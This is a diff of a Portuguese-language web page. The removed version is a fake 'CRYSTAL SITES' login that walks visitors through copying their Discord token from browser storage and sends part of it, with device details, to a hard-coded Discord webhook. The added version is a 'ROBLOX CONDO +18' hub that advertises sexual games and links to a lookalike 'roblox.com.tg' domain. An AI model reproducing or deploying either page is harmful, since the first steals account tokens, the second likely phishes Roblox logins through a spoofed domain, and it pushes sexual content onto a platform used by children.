@@ -1,475 +1,418 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - proteção método SITES</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --primary: #4a86e8;
-            --primary-hover: #3a76d8;
-            --primary-dark: #2a66c8;
-            --primary-light: #6a96f8;
-            --discord: #5865F2;
-            --text: #fff;
-            --text-light: #e6eeff;
-            --border: rgba(74, 134, 232, 0.5);
-            --glow: rgba(58, 118, 216, 0.4);
-            --gradiente-btn: linear-gradient(135deg, var(--primary), var(--primary-light));
-            --gradiente-discord: linear-gradient(135deg, var(--discord), #7983F5);
-            --success: #4CAF50;
-            --error: #f44336;
-            --overlay: rgba(0, 0, 20, 0.6);
-            --fallback-bg: linear-gradient(135deg, #1a2c5f, #2a4b8f);
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ROBLOX CONDO +18🥵</title>
+  
+  <!-- Open Graph (Discord, Facebook etc.) -->
+  <meta property="og:title" content="ROBLOX CONDO +18🥵">
+  <meta property="og:description" content="Melhor hub de jogos condo 🔥 Entre no nosso Discord e jogue com a galera!">
+  <meta property="og:image" content="https://imgur.com/a/nX5Apes.jpeg">
+  <meta property="og:url" content="https://discord.gg/2V6buQnYm">
+  <meta property="og:type" content="website">
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Poppins', sans-serif;
-        }
-
-        body {
-            background: url('https://images.unsplash.com/photo-1532274402911-5a369e4c4bb5?ixlib=rb-4.0.3&auto=format&fit=crop&w=1920&q=80') no-repeat center center fixed, var(--fallback-bg);
-            background-size: cover;
-            color: var(--text);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 2rem;
-            line-height: 1.6;
-            position: relative;
-            overflow-x: hidden;
-        }
-
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: var(--overlay);
-            z-index: -2;
-        }
-
-        #flow-canvas {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: -1;
-            pointer-events: none;
-        }
-
-        .login-container {
-            width: 100%;
-            max-width: 450px;
-            background: rgba(26, 44, 95, 0.8);
-            border-radius: 20px;
-            padding: 2.5rem;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5), 0 0 25px rgba(58, 118, 216, 0.4);
-            backdrop-filter: blur(12px);
-            border: 1px solid var(--border);
-            animation: fadeIn 1s ease-out;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .logo {
-            text-align: center;
-            margin-bottom: 2rem;
-        }
-
-        .logo h1 {
-            font-size: 2.5rem;
-            color: var(--primary-light);
-            text-shadow: 0 0 15px var(--glow);
-            margin-bottom: 0.5rem;
-        }
-
-        .logo p {
-            color: var(--text-light);
-            font-size: 1rem;
-        }
-
-        .token-section {
-            margin: 2rem 0;
-            padding: 1.5rem;
-            background: rgba(34, 52, 111, 0.4);
-            border-radius: 10px;
-            border: 1px solid var(--border);
-        }
-
-        .token-section h3 {
-            color: var(--primary-light);
-            margin-bottom: 1rem;
-            text-align: center;
-            font-size: 1.2rem;
-        }
-
-        .token-input {
-            display: flex;
-            gap: 0.5rem;
-        }
-
-        .token-input input {
-            flex: 1;
-            padding: 1rem;
-            border-radius: 10px;
-            border: 1px solid var(--border);
-            background: rgba(34, 52, 111, 0.6);
-            color: var(--text);
-            font-size: 1rem;
-        }
-
-        .token-input button {
-            padding: 1rem;
-            background: var(--gradiente-btn);
-            color: white;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .token-input button:hover {
-            background: linear-gradient(135deg, var(--primary-light), var(--primary));
-        }
-
-        .login-btn {
-            width: 100%;
-            padding: 1rem;
-            background: var(--gradiente-btn);
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 1.1rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 15px var(--glow);
-            margin-top: 1rem;
-        }
-
-        .login-btn:hover {
-            background: linear-gradient(135deg, var(--primary-light), var(--primary));
-            box-shadow: 0 7px 20px var(--glow);
-            transform: translateY(-2px);
-        }
-
-        .support {
-            text-align: center;
-            margin-top: 2rem;
-            color: var(--text-light);
-            font-size: 0.9rem;
-        }
-
-        .support a {
-            color: var(--primary-light);
-            text-decoration: none;
-        }
-
-        .support a:hover {
-            text-decoration: underline;
-        }
-
-        .alert {
-            padding: 1rem;
-            border-radius: 10px;
-            margin-bottom: 1.5rem;
-            display: none;
-        }
-
-        .alert-error {
-            background: rgba(244, 67, 54, 0.2);
-            border: 1px solid var(--error);
-            color: var(--text);
-        }
-
-        .alert-success {
-            background: rgba(76, 175, 80, 0.2);
-            border: 1px solid var(--success);
-            color: var(--text);
-        }
-
-        .info-box {
-            background: rgba(34, 52, 111, 0.4);
-            border-radius: 10px;
-            padding: 1rem;
-            margin: 1.5rem 0;
-            border: 1px solid var(--border);
-        }
-
-        .info-box h4 {
-            color: var(--primary-light);
-            margin-bottom: 0.5rem;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        .info-box p {
-            color: var(--text-light);
-            font-size: 0.9rem;
-            line-height: 1.5;
-        }
-
-        /* Responsividade */
-        @media (max-width: 768px) {
-            .login-container {
-                padding: 2rem;
-            }
-            
-            .logo h1 {
-                font-size: 2rem;
-            }
-            
-            .token-input {
-                flex-direction: column;
-            }
-        }
-
-        @media (max-width: 480px) {
-            body {
-                padding: 1rem;
-            }
-            
-            .login-container {
-                padding: 1.5rem;
-            }
-        }
-    </style>
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="NK Hub ROBLOX+18 🍥">
+  <meta name="twitter:description" content="NK Hub ROBLOX CONDO GAMES">
+  <meta name="twitter:image" content="https://i.imgur.com/xPAARNi.jpeg">
+  
+  <style>
+    :root {
+      --color-primary: #ff4d4d;
+      --color-secondary: #e60000;
+      --color-accent: #b30000;
+      --color-bg: #330000;
+      --color-card: #660000;
+      --color-text: #ffffff;
+    }
+    
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      background: linear-gradient(135deg, #330000 0%, #660000 100%);
+      color: var(--color-text);
+      font-family: 'Comic Sans MS', cursive, sans-serif;
+      min-height: 100vh;
+      overflow-x: hidden;
+      padding: 20px;
+    }
+    
+    .kawaii-container {
+      max-width: 500px;
+      margin: 0 auto;
+      position: relative;
+      z-index: 10;
+    }
+    
+    /* Cabeçalho kawaii */
+    .header {
+      text-align: center;
+      margin-bottom: 25px;
+      position: relative;
+    }
+    
+    .profile-container {
+      position: relative;
+      display: inline-block;
+      margin-bottom: 15px;
+    }
+    
+    .profile-pic {
+      width: 150px;
+      height: 150px;
+      object-fit: cover;
+      border: 4px solid var(--color-primary);
+      border-radius: 20px;
+      box-shadow: 0 0 15px rgba(255, 156, 218, 0.6);
+      transition: transform 0.3s ease;
+    }
+    
+    .profile-pic:hover {
+      transform: scale(1.05);
+    }
+    
+    /* Decorações kawaii */
+    .kawaii-decoration {
+      position: absolute;
+      font-size: 28px;
+      z-index: 5;
+      animation: float 3s ease-in-out infinite;
+    }
+    
+    .decoration-1 {
+      top: -20px;
+      right: -15px;
+      animation-delay: 0.5s;
+    }
+    
+    .decoration-2 {
+      bottom: -15px;
+      left: -20px;
+      animation-delay: 1s;
+    }
+    
+    .title {
+      font-size: 24px;
+      color: var(--color-primary);
+      text-shadow: 0 0 10px rgba(255, 156, 218, 0.7);
+      margin-bottom: 5px;
+    }
+    
+    .cute-font {
+      font-family: Arial, sans-serif;
+      font-size: 1.2em;
+      letter-spacing: 1px;
+    }
+    
+    .subtitle {
+      font-size: 16px;
+      color: var(--color-secondary);
+      margin-bottom: 20px;
+    }
+    
+    /* Botões kawaii */
+    .links-container {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-bottom: 30px;
+    }
+    
+    .link-button {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      padding: 14px 20px;
+      background: linear-gradient(145deg, #ff9cda 0%, #ff479f 100%);
+      color: white;
+      text-decoration: none;
+      border-radius: 50px;
+      border: 2px solid #ff70b8;
+      box-shadow: 0 4px 0 rgba(179, 71, 127, 0.5);
+      transition: all 0.3s ease;
+      font-weight: bold;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .link-button:before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+    }
+    
+    .link-button:hover:before {
+      left: 100%;
+    }
+    
+    .link-button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 7px 0 rgba(179, 71, 127, 0.5);
+      background: linear-gradient(145deg, #ff479f 0%, #ff9cda 100%);
+    }
+    
+    .link-button:active {
+      transform: translateY(2px);
+      box-shadow: 0 2px 0 rgba(179, 71, 127, 0.5);
+    }
+    
+    .link-emoji {
+      font-size: 20px;
+    }
+    
+    /* Footer */
+    .footer-note {
+      text-align: center;
+      padding: 15px;
+      background-color: rgba(37, 35, 72, 0.7);
+      border-radius: 15px;
+      margin-top: 20px;
+      border: 2px dashed var(--color-secondary);
+    }
+    
+    /* Neve otimizada */
+    #snow {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      pointer-events: none;
+      z-index: 1;
+    }
+    
+    /* Animações */
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    
+    @keyframes twinkle {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+    
+    /* Elementos decorativos de fundo */
+    .bg-decoration {
+      position: fixed;
+      pointer-events: none;
+      z-index: 0;
+      font-size: 24px;
+      animation: twinkle 4s infinite;
+    }
+    
+    /* Responsividade */
+    @media (max-width: 600px) {
+      .profile-pic {
+        width: 120px;
+        height: 120px;
+      }
+      
+      .title {
+        font-size: 20px;
+      }
+      
+      .link-button {
+        padding: 12px 18px;
+        font-size: 14px;
+      }
+    }
+    
+    /* Otimizações de desempenho */
+    .will-change {
+      will-change: transform, opacity;
+    }
+    
+    /* Imagem de fundo para desktop */
+    @media (min-width: 768px) {
+      body {
+        background-image: url('https://i.imgur.com/wyzUGuR.jpeg');
+        background-size: cover;
+        background-attachment: fixed;
+        background-position: center;
+      }
+      
+      body:before {
+        content: '';
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(102, 0, 0, 0.85);
+        z-index: -1;
+      }
+    }
+    
+    /* Imagem de fundo para mobile */
+    @media (max-width: 767px) {
+      body {
+        background-image: url('https://i.imgur.com/FkMQlq4.jpeg');
+        background-size: cover;
+        background-attachment: fixed;
+        background-position: center;
+      }
+      
+      body:before {
+        content: '';
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(102, 0, 0, 0.9);
+        z-index: -1;
+      }
+    }
+  </style>
 </head>
 <body>
-    <canvas id="flow-canvas"></canvas>
-    
-    <div class="login-container">
-        <div class="logo">
-            <h1>CRYSTAL SITES</h1>
-            <p>Acesso exclusivo com token do Discord</p>
-        </div>
-
-        <div id="alertBox" class="alert alert-error">
-            <i class="fas fa-exclamation-circle"></i> <span id="alertMessage"></span>
-        </div>
-
-        <div class="info-box">
-            <h4><i class="fas fa-info-circle"></i> Como obter seu token</h4>
-            <p>1. Abra o Discord no seu navegador<br>
-               2. Pressione F12 para abrir as Ferramentas do Desenvolvedor<br>
-               3. Vá para a aba "Application" > "Local Storage"<br>
-               4. Encontre o campo "token" e copie o valor</p>
-        </div>
-
-        <div class="token-section">
-            <h3>Autenticação por Token</h3>
-            <div class="token-input">
-                <input type="password" id="token" placeholder="Cole o token da sua conta Discord">
-                <button onclick="validateToken()"><i class="fas fa-check"></i></button>
-            </div>
-            <button class="login-btn" onclick="validateToken()">
-                <i class="fas fa-sign-in-alt"></i> Entrar com Token
-            </button>
-        </div>
-
-        <div class="support">
-            Precisa de ajuda? <a href="https://discord.gg/mcwxfHwm" target="_blank">Entre em nosso Discord</a>
-        </div>
+  <canvas id="snow"></canvas>
+  
+  <!-- Elementos decorativos de fundo -->
+  <div class="bg-decoration" style="top: 10%; left: 5%;">🍥</div>
+  <div class="bg-decoration" style="top: 20%; right: 7%; animation-delay: 1s;">🌸</div>
+  <div class="bg-decoration" style="top: 40%; left: 8%; animation-delay: 2s;">⭐</div>
+  <div class="bg-decoration" style="top: 70%; right: 10%; animation-delay: 3s;">🍑</div>
+  <div class="bg-decoration" style="top: 85%; left: 12%; animation-delay: 0.5s;">✨</div>
+  
+  <div class="kawaii-container">
+    <div class="header">
+      <div class="profile-container">
+        <a href="https://i.imgur.com/xPAARNi.jpeg" target="_blank">
+          <img src="https://i.imgur.com/xPAARNi.jpeg" alt="Foto de Perfil" class="profile-pic">
+        </a>
+        <div class="kawaii-decoration decoration-1">✨</div>
+        <div class="kawaii-decoration decoration-2">🌸</div>
+      </div>
+      <h1 class="title cute-font">⍣ＲＯＢＬＯＸ ＣＯＮＤＯ ＋１８🥵⍣</h1>
+      <p class="subtitle cute-font">Best CONDO GAMES 🌸</p>
     </div>
+    
+    <div class="links-container">
+      <a href="https://discord.gg/2V6buQnYm" class="link-button" target="_blank">
+        <span class="link-emoji">🎮</span> <span class="cute-font">ＤＩＳＣＯＲＤ ＳＥＲＶＥＲ</span>
+      </a>
+      
+      <a href="https://www.roblox.com.tg/games/102168567330694/Character-Talk?privateServerLinkCode=85646709654298709472382245072563" class="link-button" target="_blank">
+        <span class="link-emoji">🍑</span> <span class="cute-font">１° Ｇａｍｅ</span>
+      </a>
+      
+      <a href="https://www.roblox.com.tg/games/108152567396015/Hop-To-Neko?privateServerLinkCode=85646709654298709472382245072563" class="link-button" target="_blank">
+        <span class="link-emoji">🍑</span> <span class="cute-font">２° Ｇａｍｅ</span>
+      </a>
+      
+      <a href="https://www.roblox.com.tg/games/109697753861878/Create-AI-Girl-RP?privateServerLinkCode=85646709654298709472382245072563" class="link-button" target="_blank">
+        <span class="link-emoji">🍑</span> <span class="cute-font">３° Ｇａｍｅ</span>
+      </a>
+      
+      <a href="https://www.roblox.com.tg/games/76106209840076/Weird-Neko-Untitled-Game?privateServerLinkCode=85646709654298709472382245072563" class="link-button" target="_blank">
+        <span class="link-emoji">🍑</span> <span class="cute-font">４° Ｇａｍｅ</span>
+      </a>
+    </div>
+    
+    <p class="footer-note cute-font">
+      ＋４ Ｇａｍｅｓ<br>
+      ＭＯＲＥ ＧＡＭＥＳ ＣＯＭＩＮＧ ＳＯＯＮ
+    </p>
+  </div>
 
-    <script>
-        // Inicializar partículas de fluxo azul
-        const canvas = document.getElementById('flow-canvas');
-        const ctx = canvas.getContext('2d');
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-
-        window.addEventListener('resize', () => {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        });
-
-        class FlowParticle {
-            constructor() {
-                this.x = Math.random() * canvas.width;
-                this.y = Math.random() * canvas.height;
-                this.size = Math.random() * 3 + 1;
-                this.speedX = Math.random() * 1 - 0.5;
-                this.speedY = Math.random() * 1 - 0.5;
-                this.color = `rgba(74, 134, 232, ${Math.random() * 0.5 + 0.2})`;
-                this.angle = 0;
-            }
-
-            update() {
-                this.angle += 0.01;
-                this.x += this.speedX + Math.cos(this.angle) * 0.5;
-                this.y += this.speedY + Math.sin(this.angle) * 0.5;
-                
-                if (this.x > canvas.width || this.x < 0) {
-                    this.speedX = -this.speedX;
-                }
-                if (this.y > canvas.height || this.y < 0) {
-                    this.speedY = -this.speedY;
-                }
-            }
-
-            draw() {
-                ctx.beginPath();
-                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-                ctx.fillStyle = this.color;
-                ctx.fill();
-            }
+  <script>
+    // Sistema de neve otimizado para performance
+    (function() {
+      const canvas = document.getElementById("snow");
+      const ctx = canvas.getContext("2d");
+      let width = window.innerWidth;
+      let height = window.innerHeight;
+      let snowflakes = [];
+      const maxFlakes = 50; // Reduzido para melhor performance
+      
+      // Configuração inicial do canvas
+      function resize() {
+        width = canvas.width = window.innerWidth;
+        height = canvas.height = window.innerHeight;
+      }
+      
+      // Criar flocos de neve
+      function createSnowflakes() {
+        for (let i = 0; i < maxFlakes; i++) {
+          snowflakes.push({
+            x: Math.random() * width,
+            y: Math.random() * height,
+            radius: Math.random() * 2 + 1,
+            speed: Math.random() * 1 + 0.5,
+            opacity: Math.random() * 0.5 + 0.3,
+            swing: Math.random() * 0.5 - 0.25
+          });
         }
-
-        let particles = [];
-        for (let i = 0; i < 100; i++) {
-            particles.push(new FlowParticle());
+      }
+      
+      // Desenhar flocos de neve
+      function drawSnowflakes() {
+        ctx.clearRect(0, 0, width, height);
+        for (let i = 0; i < snowflakes.length; i++) {
+          const flake = snowflakes[i];
+          ctx.beginPath();
+          ctx.arc(flake.x, flake.y, flake.radius, 0, Math.PI * 2);
+          ctx.fillStyle = `rgba(255, 255, 255, ${flake.opacity})`;
+          ctx.fill();
         }
-
-        function connectParticles() {
-            for (let i = 0; i < particles.length; i++) {
-                for (let j = i; j < particles.length; j++) {
-                    const dx = particles[i].x - particles[j].x;
-                    const dy = particles[i].y - particles[j].y;
-                    const distance = Math.sqrt(dx * dx + dy * dy);
-                    
-                    if (distance < 100) {
-                        ctx.beginPath();
-                        ctx.strokeStyle = `rgba(74, 134, 232, ${0.2 - distance/500})`;
-                        ctx.lineWidth = 0.5;
-                        ctx.moveTo(particles[i].x, particles[i].y);
-                        ctx.lineTo(particles[j].x, particles[j].y);
-                        ctx.stroke();
-                    }
-                }
-            }
+        moveSnowflakes();
+      }
+      
+      // Mover flocos de neve
+      function moveSnowflakes() {
+        for (let i = 0; i < snowflakes.length; i++) {
+          const flake = snowflakes[i];
+          flake.y += flake.speed;
+          flake.x += flake.swing;
+          
+          if (flake.y > height) {
+            flake.y = -10;
+            flake.x = Math.random() * width;
+          }
+          
+          if (flake.x > width + 5 || flake.x < -5) {
+            flake.swing = -flake.swing;
+          }
         }
-
-        function animateFlow() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            
-            particles.forEach(particle => {
-                particle.update();
-                particle.draw();
-            });
-            
-            connectParticles();
-            requestAnimationFrame(animateFlow);
+      }
+      
+      // Loop de animação otimizado
+      let lastTime = 0;
+      const fps = 30;
+      const fpsInterval = 1000 / fps;
+      
+      function animateSnow(time) {
+        requestAnimationFrame(animateSnow);
+        
+        const now = time;
+        const elapsed = now - lastTime;
+        
+        if (elapsed > fpsInterval) {
+          lastTime = now - (elapsed % fpsInterval);
+          drawSnowflakes();
         }
-
-        animateFlow();
-
-        // Configuração do Webhook do Discord
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1416902668189962310/2hYTdYIe4BYrBcQDk_wouXGHIS26CKFh9VDbGuGD_bgHyJmOxInzjtDBw12J9jEA-tLB";
-
-        // Função para enviar mensagem para o webhook do Discord
-        async function sendDiscordWebhook(token, success) {
-            try {
-                const payload = {
-                    embeds: [{
-                        title: success ? "✅ Login Bem-sucedido" : "❌ Tentativa de Login",
-                        color: success ? 3066993 : 15158332,
-                        fields: [
-                            {
-                                name: "🔑 Token Utilizado",
-                                value: token ? `\`${token.substring(0, 10)}...\`` : "Não informado",
-                                inline: true
-                            },
-                            {
-                                name: "🌐 User Agent",
-                                value: navigator.userAgent.substring(0, 50) + "...",
-                                inline: false
-                            },
-                            {
-                                name: "📱 Plataforma",
-                                value: navigator.platform,
-                                inline: true
-                            },
-                            {
-                                name: "⏰ Horário",
-                                value: new Date().toLocaleString('pt-BR'),
-                                inline: true
-                            }
-                        ],
-                        timestamp: new Date().toISOString(),
-                        footer: {
-                            text: "Sistema de Login • Crystal Sites"
-                        }
-                    }]
-                };
-
-                const response = await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload),
-                });
-
-                if (!response.ok) {
-                    console.error('Erro ao enviar webhook:', await response.text());
-                }
-            } catch (error) {
-                console.error('Erro ao enviar webhook:', error);
-            }
-        }
-
-        // Funções de autenticação
-        function showAlert(message, isError = true) {
-            const alertBox = document.getElementById('alertBox');
-            const alertMessage = document.getElementById('alertMessage');
-            
-            alertMessage.textContent = message;
-            alertBox.className = isError ? 'alert alert-error' : 'alert alert-success';
-            alertBox.style.display = 'flex';
-            
-            setTimeout(() => {
-                alertBox.style.display = 'none';
-            }, 5000);
-        }
-
-        function validateToken() {
-            const token = document.getElementById('token').value;
-            
-            if (!token) {
-                showAlert('Por favor, insira um token para validar.');
-                return;
-            }
-            
-            // Validação básica de token (formato geral de tokens do Discord)
-            if (token.length >= 50) {
-                showAlert('Token validado com sucesso! Redirecionando...', false);
-                
-                // Enviar notificação para o Discord
-                sendDiscordWebhook(token, true);
-                
-                setTimeout(() => {
-                    window.location.href = 'index.html';
-                }, 1500);
-            } else {
-                showAlert('Token inválido. Certifique-se de que é um token válido do Discord.');
-                
-                // Enviar notificação de falha para o Discord
-                sendDiscordWebhook(token, false);
-            }
-        }
-
-        // Capturar a tecla Enter para submeter o token
-        document.addEventListener('keypress', function(event) {
-            if (event.key === 'Enter') {
-                validateToken();
-            }
-        });
-
-        // Mostrar/ocultar token
-        document.getElementById('token').addEventListener('dblclick', function() {
-            this.type = this.type === 'password' ? 'text' : 'password';
-        });
-    </script>
+      }
+      
+      // Inicializar
+      window.addEventListener("resize", resize);
+      resize();
+      createSnowflakes();
+      requestAnimationFrame(animateSnow);
+    })();
+  </script>
 </body>
     </html>
